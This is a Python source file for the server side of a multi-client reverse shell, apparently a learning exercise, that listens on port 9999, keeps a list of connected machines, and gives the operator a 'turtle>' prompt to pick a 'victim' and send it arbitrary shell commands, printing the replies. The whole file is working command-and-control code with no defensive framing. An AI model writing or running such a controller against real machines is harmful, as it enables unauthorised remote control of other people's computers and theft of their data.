import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS=2 #2 threads required
JOB_NUMBER=[1,2]
queue=Queue()
all_connections=[]
all_address=[]

#create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host=""
        port=9999 #uncommon port
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error "+str(msg))

#Binding the socket and listning
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port "+str(port))
        s.bind((host,port))
        s.listen(5) #num of connections it listens
    except socket.error as msg:
        print("Socket biding error "+str(msg)+"\n"+" Rebinding....")
        bind_socket()


#Handling connections from multiple clients and saving to a list
#closing all previous connection when the server file re started

def accepting_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_address[:]
    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  
            all_connections.append(conn)
            all_address.append(address)
            print("Connection been established : "+ address[0]) #1st connect then print
        except:
            print("Error accepting connections ")


'''def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")'''
#2nd thread content to send commands
#Interractive prompts for sending commands
def start_turtle(): #name of our shell
    while True:
        cmd = input('turtle> ')
        if cmd=='list':
            list_connections() #list of connected clients
        elif 'select' in cmd:
            conn=get_target(cmd) #select and connect with the client #using id
            if conn is not None: #conn exhist or not
                send_target_commands(conn)
        else:
            print("Command not recognized")

#Display all current active connections with clients
def list_connections():
    results=''
    for i,conn in enumerate(all_connections): # i=0,1,2,...
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except: #if receives nothing
            del all_connections[i]
            del all_address[i]
            continue
        results=str(i)+" "+str(all_address[i][0])+" "+str(all_address[i][1])+"\n"
        #1 a.b.c.d 9999
    print("------Clients-------"+"\n"+results)

#selecting the target
def get_target(cmd):
    try:
        target=cmd.replace('select ','') #target ->id_str
        target=int(target)#target ->id_int
        conn=all_connections[target]
        print("You r now connected to :"+str(all_address[target][0]))
        print(str(all_address[target][0])+"> ",end="")
        return conn
        #192.168.0.3> dir
    except:
        print("Selection not valid :")
        return None

#Send command to victim
def send_target_commands(conn):
    while True:
        try:
            cmd=input() #from command prompt
            if cmd=='quit':
                break #back to turtle
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480),"utf-8") #chunck size 1024 buffer size
                print(client_response,end="") #cursor to next line after enter
        except: #back to turtle
            print("Error sending commands")
            break
#thread system

#create worker thread
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work) #what kind of work the thread needs to perform
        t.daemon=True
        t.start()

#do next job (handle connections , send commands)
def work():
    while True:
        x=queue.get()
        if x==1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x==2:
            start_turtle()
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()
